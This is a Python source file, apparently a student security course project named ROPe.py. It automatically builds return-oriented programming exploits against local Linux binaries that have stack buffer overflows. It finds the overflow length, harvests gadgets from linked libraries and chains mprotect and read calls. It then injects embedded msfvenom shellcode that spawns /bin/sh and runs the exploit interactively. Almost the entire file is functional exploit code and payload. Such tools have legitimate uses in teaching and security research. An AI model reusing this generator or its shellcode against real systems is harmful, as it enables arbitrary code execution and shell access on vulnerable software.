#!/usr/bin/env python3
#
# Daniel Calabria
# 103406017
# CSE 363 Project
#
# ROPe.py
# Return Oriented Programming executor.
#
# Developed on Kali Linux 2020.1 x86-64 w/ libc 2.30-4


import os
import argparse
import struct
from subprocess import *
import re
from capstone import *
from pwn import *


########################### MODIFIABLE VARIABLES ##############################
# gen'd by msfvenom for linux/x64/exec CMD='/bin/sh', avoid \x00 
EXEC_BINSH64_SC =  b""
EXEC_BINSH64_SC += b"\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05"
EXEC_BINSH64_SC += b"\xef\xff\xff\xff\x48\xbb\x71\x08\x60\xd2\x83\x85\xee"
EXEC_BINSH64_SC += b"\xcb\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
EXEC_BINSH64_SC += b"\x1b\x33\x38\x4b\xcb\x3e\xc1\xa9\x18\x66\x4f\xa1\xeb"
EXEC_BINSH64_SC += b"\x85\xbd\x83\xf8\xef\x08\xff\xe0\x85\xee\x83\xf8\xee"
EXEC_BINSH64_SC += b"\x32\x3a\x8b\x85\xee\xcb\x5e\x6a\x09\xbc\xac\xf6\x86"
EXEC_BINSH64_SC += b"\xcb\x27\x5f\x28\x5b\x65\x8a\xeb\xcb"

# If multiple shellcodes are provided above, which one should be executed?
shellcode = EXEC_BINSH64_SC

# Adjust the maximum size of an exploitable buffer to search for
MAX_BUFFER_SIZE = 1024

# Adjust the maximum size of gadgets we examine. The bigger the size, the longer
# it will take to build the gadget map.
MAX_GADGET_SIZE = 25

######################## DO NOT MODIFY BELOW THIS LINE ########################
PLACEHOLDER = 0xdeadc0de
gadget_map = {}
has_libc = True
libc_addr = None
buflen = 0
bufaddr = None
mprotect_addr = None
sc_addr = None
verbose = False
disable_exec = False
disable_file_output = False

# pretty colors
class Colors:
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    YELLOW = "\033[0;33m"
    CYAN = "\033[0;36m"
    GREY = "\033[0;37m"
    WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


# Prints out `s` if verbosity/debugging is enabled 
def debug(s):
    if verbose is True:
        print(f"{Colors.RED}{Colors.BOLD}DEBUG{Colors.WHITE}: {Colors.RESET}{s}{Colors.GREY}")


# Determines the length of the buffer necessary to cause SEGV
def find_buffer_length(f):
    buf = "A"
    found = False

    while found is False:
        # cap our buffer size so we don't sit here forever if a program isn't vulnerable
        if len(buf) > MAX_BUFFER_SIZE:
            break

        proc = subprocess.Popen([f], stdin=PIPE, stdout=PIPE, stderr=STDOUT)
        try:
            stdout = proc.communicate(input=bytes(buf.encode('ascii')))
        except TimeoutExpired:
            proc.kill()
        #proc = process([f])
        #proc.sendline(buf)
        #proc.recvall()

        if proc.returncode == -11:
            debug(f"found overflow length: {len(buf)}")
            found = True
            break
        buf += "A"
        #proc.close()

    if found is False:
        return -1
    return len(buf)


# Determines the address of the buffer
def find_buffer_addr(f):
    # since ASLR is disabled, we should be able to write a small program
    # using the known information about the size/length of the buffer
    # before it overflows, then print out that addr for the buffer
    # in a dummy program
    try:
        buf_addr_prog = open("./find-vuln-buf.c", "w+")
        buf_addr_prog.write(
                "#include <stdio.h>\n" +
                "#include <string.h>\n" +
                "\n" +
                "int main(int argc, char *argv[])\n" +
                "{\n" +
                f"    char buf[{buflen-8}];\n" +
                "    printf(\"%p\", buf);\n" +
                "    return 0;\n" +
                "}")
        buf_addr_prog.close()
        
        gcc = subprocess.Popen(["gcc", "-fno-stack-protector", "-g", "-o", "find-vuln-buf", "find-vuln-buf.c"], stdout=PIPE, stderr=PIPE)
        try:
            stdout, stderr = gcc.communicate(timeout=5)
        except TimeoutExpired:
            gcc.kill()
            stdout, stderr = gcc.communicate()

        bufproc = subprocess.Popen(["./find-vuln-buf"], stdout=PIPE, stderr=PIPE)
        bufaddr = None
        try:
            stdout, stderr = bufproc.communicate(timeout=5)
            bufaddr = stdout
        except TimeoutExpired:
            bufproc.kill()

        subprocess.Popen(["rm", "-rf", "find-vuln-buf.c", "find-vuln-buf"])
        return bufaddr

    except Exception as err:
        print(f"{Colors.BOLD}{Colors.RED}Failed to write file: {err}{Colors.GREY}{Colors.RESET}")
        return None


# Small helper function to print a gadget in human-readable format
def print_gadget(g, g_addr):
    if verbose == 0:
        return

    md = Cs(CS_ARCH_X86, CS_MODE_64)
    md.detail = False

    instr_list = md.disasm(g, g_addr)
    s = f"{Colors.BOLD}{Colors.WHITE}" + format(g_addr, '#010x') + f"{Colors.GREY}: "
    for i in instr_list:
        s += i.mnemonic
        if i.op_str != "":
            s += f" {i.op_str}"
        s += f"{Colors.YELLOW};{Colors.GREY} "
    s += f"{Colors.RESET}{Colors.GREY}"
    print(s)


# Looks for usable gadgets in elfname, which is loaded into our target binary at baseaddr
def build_gadgets(elfname, baseaddr):
    global gadget_map
    global MAX_GADGET_SIZE

    gadgets = {}

    elf = ELF(elfname, checksec=False)
    print(f"{Colors.RESET}{Colors.GREY}Scanning \'{Colors.CYAN}{elfname}{Colors.GREY}\' for gadgets...")

    # we're only concerned with executable segments
    for seg in elf.executable_segments:
        debug(f"Executable segment @ {hex(baseaddr + seg.header.p_paddr)} (offset {hex(seg.header.p_paddr)})")

        # read the segment
        data = elf.read(seg.header.p_paddr, seg.header.p_filesz)
        
        # does section contain ret instrs?
        ret_count = data.count(b"\xc3")
        if ret_count == 0:
            continue

        # split around ret instrs, clamp them to be <= MAX_GADGET_SIZE bytes long, and incrementally add unique ones into the gadgets list
        s_data = data.split(b"\xc3")
        s_offset = 0x0
        for s in s_data:
            # splitting around c3 bytes actually removes them, so we need to add them back in
            s += b"\xc3"

            s_len = len(s)
            i = 0
            if s_len > MAX_GADGET_SIZE:
                s_len = MAX_GADGET_SIZE

            while i < s_len:
                gadgets[baseaddr + s_offset + seg.header.p_offset + i] = s[i:s_len]
                i += 1

            s_offset += len(s)
            
        # check if the gadgets found are unique, and add them to the global map if so
        for g_addr in gadgets:
            if gadgets[g_addr] not in gadget_map.values():
                md = Cs(CS_ARCH_X86, CS_MODE_64)
                md.detail = False
                g = gadgets[g_addr]
                instr_list = md.disasm(g, g_addr)

                if instr_list is None:
                    continue

                g_len = len(g)
                cur_len = 0
                keep_gadget = True
                has_ret = False
                has_syscall = False

                for i in instr_list:
                    cur_len += i.size
                    # we only want things that end in ret
                    if i.mnemonic == "ret" and i.op_str == "":
                        has_ret = True

                    # get rid of all leave/j/call type instructions
                    if i.mnemonic == "leave":
                        keep_gadget = False
                        break
                    if i.mnemonic[0] == 'j':
                        keep_gadget = False
                        break
                    if i.mnemonic == "call":
                        keep_gadget = False
                        break

                if keep_gadget and cur_len == g_len and has_ret:
                    gadget_map[g_addr] = g
                    print_gadget(g, g_addr)


############################## GADGET LOCATORS ################################

# Looks for `syscall; ret;` gadget, returning an address if found, or None if not found
def find_syscall_ret():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 2:
            if instr_list[0].mnemonic == "syscall" and instr_list[1].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}syscall; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}syscall; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None


# Looks for `pop rax; ret;` gadget, returning an address if found, or None if not found
def find_pop_rax_ret():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 2:
            if instr_list[0].mnemonic == "pop" and instr_list[0].op_str == "rax" and instr_list[1].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}pop rax; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}pop rax; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None


# Looks for `pop rdi; ret;` gadget, returning an address if found, or None if not found
def find_pop_rdi_ret():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 2:
            if instr_list[0].mnemonic == "pop" and instr_list[0].op_str == "rdi" and instr_list[1].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}pop rdi; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}pop rdi; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None

# Looks for `pop rsi; ret;` gadget, returning an address if found, or None if not found
def find_pop_rsi_ret():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 2:
            if instr_list[0].mnemonic == "pop" and instr_list[0].op_str == "rsi" and instr_list[1].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}pop rsi; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}pop rsi; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None


# Looks for `pop rdx; ret;` gadget, returning an address if found, or None if not found
def find_pop_rdx_ret():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 2:
            if instr_list[0].mnemonic == "pop" and instr_list[0].op_str == "rdx" and instr_list[1].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}pop rdx; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}pop rdx; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None


# pop r12; pop r13; ret;
def find_pop_r12_pr():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 3:
            if instr_list[0].mnemonic == "pop" and instr_list[0].op_str == "r12" and instr_list[1].mnemonic == "pop" and instr_list[1].op_str == "r13" and instr_list[2].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}pop r12; pop r13; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}pop r12; pop r13; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None


# mov rdx, r12; pop r12; pop r13; ret
def find_mov_rdx_r12_ppr():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 4:
            if instr_list[0].mnemonic == "mov" and instr_list[0].op_str == "rdx, r12" and instr_list[1].mnemonic == "pop" and instr_list[1].op_str == "r12" and instr_list[2].mnemonic == "pop" and instr_list[2].op_str == "r13" and instr_list[3].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}mov rdx, r12; pop r12; pop r13; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}mov rdx, r12; pop r12; pop r13; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None

# Looks for `xor rax, rax; ret;` gadget, returning an address if found, or None if not found
def find_xor_rax_rax_ret():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 2:
            if instr_list[0].mnemonic == "xor" and instr_list[0].op_str == "rax, rax" and instr_list[1].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}xor rax, rax; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}xor rax, rax; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None


# Looks for `add rax, 1; ret;` gadget, returning an address if found, or None if not found
def find_add_rax_1_ret():
    global gadget_map
    for g_addr in gadget_map:
        md = Cs(CS_ARCH_X86, CS_MODE_64)
        md.detail = False
        g = gadget_map[g_addr]
        instr_list = list(md.disasm(g, g_addr))

        if len(instr_list) == 2:
            if instr_list[0].mnemonic == "add" and instr_list[0].op_str == "rax, 1" and instr_list[1].mnemonic == "ret":
                debug(f"found suitable {Colors.BOLD}{Colors.CYAN}add rax, 1; ret;{Colors.GREY} gadget @ {Colors.YELLOW}{hex(g_addr)}{Colors.GREY}{Colors.RESET}")
                return g_addr
    debug(f"no suitable {Colors.BOLD}{Colors.CYAN}add  rax, 1; ret;{Colors.GREY} gadget found!{Colors.RESET}")
    return None

############################### CHAIN BUILDERS ################################

# Attempts to build the syscall-mprotect chain
def build_syscall_mprotect(f):
    # our goal here is to `mprotect(ADDR, LEN, R|W|X)` via system call
    # followed by a read() into that area
    # then we return into that area

    global buflen
    global sc_addr
    global libc_addr

    debug(f"libc base addr @ {Colors.YELLOW}{hex(libc_addr)}{Colors.GREY}")

    syscall = find_syscall_ret() # addr of syscall gadget
    pop_rax = find_pop_rax_ret() # syscall number, should be 0xa (10) for mprotect
    pop_rdi = find_pop_rdi_ret() # 1st arg
    pop_rsi = find_pop_rsi_ret() # 2nd arg
    
    # 3rd arg, need to get 0x7 into rdx by using r12
    pop_r12_pr = find_pop_r12_pr() # r12 = 7
    mov_rdx_r12_ppr = find_mov_rdx_r12_ppr() # rdx = r12

    xor_rax_rax = find_xor_rax_rax_ret() # rax = 0
    add_rax_1 = find_add_rax_1_ret()     # used to increment rax to the correct syscall number

    if syscall is None or pop_rax is None or pop_rdi is None or pop_rsi is None or pop_r12_pr is None or mov_rdx_r12_ppr is None or xor_rax_rax is None or add_rax_1 is None:
        print(f"{Colors.BOLD}{Colors.RED}Insufficient gadgets found for this chain!{Colors.GREY}{Colors.RESET}")
        return None

    payload = b'A' * buflen                 # padding

    # first the mprotect call to set up the area
    payload += p64(xor_rax_rax)        # rax = 0
    payload += p64(add_rax_1) * 10     # rax = 10
    payload += p64(pop_rdi)            # 1st arg
    payload += p64(sc_addr)            # address we want to make r/w/x
    payload += p64(pop_rsi)            # 2nd arg
    payload += p64(0x1000)             # 4kb (pagesize)
    payload += p64(pop_r12_pr)         # r12 = 7
    payload += p64(0x7)                # R|W|X
    payload += p64(PLACEHOLDER)        # needed because pop_r12_pr has an extra pop in it
    payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 7
    payload += p64(PLACEHOLDER) * 2    # needed because mov_rdx_r12_ppr has 2 extra pops in it
    payload += p64(syscall)            # syscall

    # second, we use a read() call to read the shellcode into the buffer
    payload += p64(xor_rax_rax)        # rax = 0
    payload += p64(pop_rdi)            # 1st arg
    payload += p64(0x0)                # fd0 (stdin)
    payload += p64(pop_rsi)            # 2nd arg
    payload += p64(sc_addr)            # address to write into
    payload += p64(pop_r12_pr)         # r12 = 4kb
    payload += p64(0x1000)             # 4kb
    payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
    payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 4kb
    payload += p64(PLACEHOLDER) * 2    # needed for the extra ppr in mov_rdx_r12_ppr
    payload += p64(syscall)            # syscall

    # finally, return into the RWX page containing the shellcode
    payload += p64(sc_addr)            # return into the read shellcode

    return payload


# Attempts to build the syscall-mmap chain
#def build_syscall_mmap(f):
#    # Here we try to `mmap(ADDR, LENGTH, R|W|X, MAP_SHARED | MAP_ANONYMOUS, FD, OFFSET)` via system call
#    #                      rdi   rsi     rdx              r10               r8   r9
#    #                                    0x7    0x01       | 0x20           -1     0    
#    # rax gets return value of mmap syscall
#    #
#    # Followed by a read() into that area
#    # Followed by a return into that read shellcode
#
#    global buflen
#    global sc_addr
#    global libc_addr
#
#    # Find required gadgets
#    syscall = find_syscall_ret()
#    pop_rdi = find_pop_rdi_ret()
#    pop_rsi = find_pop_rsi_ret()
#
#
#    xor_rax_rax = find_xor_rax_rax_ret()
#    pop_r12_pr  = find_pop_r12_pr()
#    mov_rdx_r12_ppr = find_mov_rdx_r12_ppr()
#
#    payload  = b'A' * buflen        # padding
#
#    # First the mmap call
#    payload += p64(pop_rdi)         # 1st arg
#    payload += p64(0x0)             # 0
#    payload += p64(pop_rsi)         # 2nd arg
#    payload += p64(0x1000)          # 4kb (pagesize)
#    payload += p64(pop_r12_pr)      # 
#    payload += p64(0x7)             # R|W|X
#    payload += p64(PLACEHOLDER)     # for 2nd pop in pop_r12_pr
#    payload += p64(mov_rdx_r12_ppr) # 3rd arg, rdx = 0x7
#    payload += p64(PLACEHOLDER) * 2 # needed for the extra ppr in mov_rdx_r12_ppr
#
#    payload += p64(pop_r10)         # 4th arg
#    payload += p64(0x21)            # MAP_SHARED | MAP_ANONYMOUS
#    payload += p64(pop_r8)          # 5th arg
#    payload += p64(0xffffffff)      # -1
#    payload += p64(pop_r9)          # 6th arg
#    payload += p64(0x0)             # 0
#
#    # save rax for later
#
#    # Then the read call
#    payload += p64(xor_rax_rax)        # rax = 0
#    payload += p64(pop_rdi)            # 1st arg
#    payload += p64(0x0)                # fd0 (stdin)
#    payload += p64(pop_rsi)            # 2nd arg
#    payload += p64(sc_addr)            # address to write into
#    payload += p64(pop_r12_pr)         # r12 = 4kb
#    payload += p64(0x1000)             # 4kb
#    payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
#    payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 4kb
#    payload += p64(PLACEHOLDER) * 2    # needed for the extra ppr in mov_rdx_r12_ppr
#    payload += p64(syscall)            # syscall
#
#    # Then return into the new RWX page
#    return payload


# Attemps to build the libc-mprotect chain
def build_libc_mprotect(f):
    # our goal here is to `mprotect(ADDR, LEN, R|W|X)` via library call
    # followed by a read() into that area
    # then we return into that area

    global buflen
    global sc_addr
    global libc_addr
    global mprotect_addr

    debug(f"{Colors.RESET}{Colors.GREY}libc base addr @ {Colors.YELLOW}{hex(libc_addr)}{Colors.GREY}")
    debug(f"{Colors.RESET}{Colors.GREY}mprotect @ {Colors.YELLOW}{hex(mprotect_addr)}{Colors.GREY}")

    syscall = find_syscall_ret() # addr of syscall gadget
    pop_rax = find_pop_rax_ret() # syscall number, should be 0xa (10) for mprotect
    pop_rdi = find_pop_rdi_ret() # 1st arg
    pop_rsi = find_pop_rsi_ret() # 2nd arg
    
    # 3rd arg, need to get 0x7 into rdx by using r12
    pop_r12_pr = find_pop_r12_pr() # r12 = 7
    mov_rdx_r12_ppr = find_mov_rdx_r12_ppr() # rdx = r12

    xor_rax_rax = find_xor_rax_rax_ret() # rax = 0
    add_rax_1 = find_add_rax_1_ret()     # used to increment rax to the correct syscall number

    if syscall is None or pop_rax is None or pop_rdi is None or pop_rsi is None or pop_r12_pr is None or mov_rdx_r12_ppr is None or xor_rax_rax is None or add_rax_1 is None:
        print(f"{Colors.BOLD}{Colors.RED}Insufficient gadgets found for this chain!{Colors.GREY}{Colors.RESET}")
        return None

    payload = b'A' * buflen            # padding

    # first the mprotect call to set up the area
    payload += p64(xor_rax_rax)        # rax = 0
    payload += p64(add_rax_1) * 10     # rax = 10
    payload += p64(pop_rdi)            # 1st arg
    payload += p64(sc_addr)            # address we want to make r/w/x
    payload += p64(pop_rsi)            # 2nd arg
    payload += p64(0x1000)             # 4kb (pagesize)
    payload += p64(pop_r12_pr)         # r12 = 7
    payload += p64(0x7)                # R|W|X
    payload += p64(PLACEHOLDER)        # needed because pop_r12_pr has an extra pop in it
    payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 7
    payload += p64(PLACEHOLDER) * 2    # needed because mov_rdx_r12_ppr has 2 extra pops in it
    payload += p64(mprotect_addr)      # mprotect()

    # second, we use a read() call to read the shellcode into the buffer
    payload += p64(xor_rax_rax)        # rax = 0
    payload += p64(pop_rdi)            # 1st arg
    payload += p64(0x0)                # fd0 (stdin)
    payload += p64(pop_rsi)            # 2nd arg
    payload += p64(sc_addr)            # address to write into
    payload += p64(pop_r12_pr)         # r12 = 4kb
    payload += p64(0x1000)             # 4kb
    payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
    payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 4kb
    payload += p64(PLACEHOLDER) * 2    # needed for the extra ppr in mov_rdx_r12_ppr
    payload += p64(syscall)            # syscall

    # finally, return into the RWX page containing the shellcode
    payload += p64(sc_addr)            # return into the read shellcode

    return payload


# Attempts to build one of the chains for the specified file
def build_chain(filename):
    global gadget_map
    global has_libc
    global libc_addr
    global buflen
    global bufaddr
    global mprotect_addr
    global sc_addr
    global disable_exec

    # reset to defaults, in case this is for a non-first binary
    gadget_map = {}
    has_libc = True
    libc_addr = None
    buflen = 0
    bufaddr = None
    mprotect_addr = None
    sc_addr = None

    print(f"{Colors.BOLD}{Colors.WHITE}Attempting to build ROP chain for \'{Colors.YELLOW}{filename}{Colors.WHITE}\'{Colors.RESET}{Colors.GREY}")

    elf = ELF(filename, checksec=False)

    # What libraries is this linked against?
    # Herein we look for libc so we can update the libc base address (req'd for the libc calls above)
    # and also build the gadget list for each library
    for libname in elf.libs:
        debug(f"ELF linked against {libname} : {hex(elf.libs[libname])}")

        if sc_addr is None:
            for s in elf.segments:
                if s.header.p_type == 'PT_LOAD' and s.header.p_flags == 6:
                    # ok, this should be a good spot.. needs to be page aligned, though
                    h = s.header
                    addr = h.p_vaddr
                    if addr % 4096 != 0:
                        addr += 4096
                        addr = addr // 4096
                        addr *= 4096
                    sc_addr = elf.libs[libname] + addr
                    debug(f"targetting address for mprotect {hex(sc_addr)}")

        # is it libc? update the libc base addr
        if '/libc.' in libname or '/libc-' in libname:
            has_libc = True
            libc_addr = elf.libs[libname]
            debug(f"libc base address @ {hex(libc_addr)}")
            libc = ELF(libname, checksec=False)
            mprotect_addr = libc_addr + libc.symbols['mprotect']
            debug(f"libc mprotect addr @ {hex(mprotect_addr)}")

        # Build the collection of gadgets
        build_gadgets(libname, elf.libs[libname])

    print(f"{Colors.BOLD}{Colors.YELLOW}{len(gadget_map)}{Colors.GREY} gadgets found.{Colors.RESET}")

    # Determine length of buffer which causes vulnerability
    buflen = find_buffer_length(filename)
    if buflen <= 0:
        print(f"{Colors.BOLD}{Colors.YELLOW}{filename}{Colors.WHITE} does not appear to be vulnerable.")
        return None
    print(f"Target buffer overflows at {Colors.BOLD}{Colors.GREEN}{buflen}{Colors.RESET}{Colors.GREY} bytes")

    # Determines the address of the buffer in memory
    bufaddr = find_buffer_addr(filename)
    if bufaddr is None:
        print(f"{Colors.BOLD}{Colors.YELLOW}Unable to determine buffer address.{Colors.GREY}{Colors.RESET}")
        return None

    # Try syscall-mprotect chain
    print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}syscall-mprotect{Colors.GREY} chain...")
    res = build_syscall_mprotect(filename)
    if res is not None:
        print(f"{Colors.BOLD}{Colors.WHITE}Successfully constructed {Colors.YELLOW}syscall-mprotect{Colors.WHITE} chain...{Colors.GREY}{Colors.RESET}")
        if disable_file_output is False:
            fn = filename[filename.rfind("/")+1:]
            write_payload(f"{fn}-syscall-mprotect-payload.ROPe", res)
        if disable_exec is False:
            try:
                print(f"{Colors.BOLD}{Colors.WHITE}*** Attempting ROP payload execution on {Colors.GREEN}{filename}{Colors.GREY}{Colors.RESET}")
                p = process([filename])
                p.sendline(bytes(res))
                p.sendline(bytes(shellcode))
                p.interactive()
                p.close()
            except Exception as err:
                print(f"{Colors.BOLD}*** {Colors.RED}ERROR: {err}")



    # Try libc-mprotect chain
    print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}libc-mprotect{Colors.GREY} chain...")
    res = None
    if has_libc is True:
        res = build_libc_mprotect(filename)
    else:
        print(f"{Colors.BOLD}{Colors.RED}libc not found! Skipping chain...{Colors.RESET}{Colors.GREY}")
    if res is not None:
        print(f"{Colors.BOLD}{Colors.WHITE}Successfully constructed {Colors.YELLOW}libc-mprotect{Colors.WHITE} chain...{Colors.GREY}{Colors.RESET}")
        if disable_file_output is False:
            fn = filename[filename.rfind("/")+1:]
            write_payload(f"{fn}-libc-mprotect-payload.ROPe", res)
        if disable_exec is False:
            try:
                print(f"{Colors.BOLD}{Colors.WHITE}*** Attempting ROP payload execution on {Colors.GREEN}{filename}{Colors.GREY}{Colors.RESET}")
                p = process([filename])
                p.sendline(bytes(res))
                p.sendline(bytes(shellcode))
                p.interactive()
                p.close()
            except Exception as err:
                print(f"{Colors.BOLD}*** {Colors.RED}ERROR: {err}")

    # Try syscall-mmap chain
    #print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}syscall-mmap{Colors.GREY} chain...")
    #res = build_syscall_mmap(filename)
    #if res is not None:
    #    print(f"{Colors.BOLD}{Colors.WHITE}Successfully constructed {Colors.YELLOW}syscall-mmap{Colors.WHITE} chain...{Colors.GREY}{Colors.RESET}")
    #    write_payload(f"ROPe-syscall-mprotect-payload", res)
    #    if disable_exec is False:
    #        print(f"{Colors.BOLD}{Colors.WHITE}*** Executing {Colors.GREEN}{filename}{Colors.GREY}{Colors.RESET}")
    #        p = process([filename])
    #        p.sendline(bytes(res))
    #        p.sendline(bytes(shellcode))
    #        p.interactive()


# Prints out the generated payload in a human-readable format (hex-encoded string)
def write_payload(filename, payload):
    outf = open(filename, "wb+")
    outf.write(payload)
    outf.close()
    print(f"{Colors.BOLD}{Colors.WHITE}ROP Chain stored in: \'{Colors.YELLOW}{filename}{Colors.WHITE}\'{Colors.RESET}")


# Main ROPe function
def ROPe():
    # parse arguments
    parser = argparse.ArgumentParser(description="Automatically generate a ROP chain suitable for executing a third party payload.")
    parser.add_argument('-v', action='store_true', help='enable verbose output')
    parser.add_argument('-x', action='store_true', help='do not attempt to launch process with ROP payload')
    parser.add_argument('-d', action='store_true', help='do not write generated payloads out as files')
    parser.add_argument('files', nargs='+', help='list of ELFs to examine (must be in $PATH, or absolute paths)')
    args = parser.parse_args()

    if args.v:
        global verbose
        verbose = True
        debug("verbose: True")

    if args.x:
        global disable_exec
        disable_exec = True
        debug("disable_exec: True")

    if args.d:
        global disable_file_output
        disable_file_output = True
        debug("disable_file_output: True")

    if args.files:
        global files
        debug(f"Files: {args.files}")
        files = args.files

    context(os='linux', arch='amd64')

    debug(f"{Colors.BOLD}{Colors.GREY}Supplied shellcode{Colors.WHITE}: {Colors.GREY}\"{Colors.YELLOW}")
    if verbose == 1:
        sys.stdout.buffer.write(shellcode)
    debug(f"{Colors.GREY}\" {Colors.WHITE}")
   
    # Go through each supplied file, trying to build a ROP chain using it's gadgets
    for f in files:
        try:
            build_chain(f)
        except FileNotFoundError:
            print(f"{Colors.BOLD}{Colors.YELLOW}{f}{Colors.GREY} not found.{Colors.RESET}")


if __name__ == "__main__":
    ROPe()
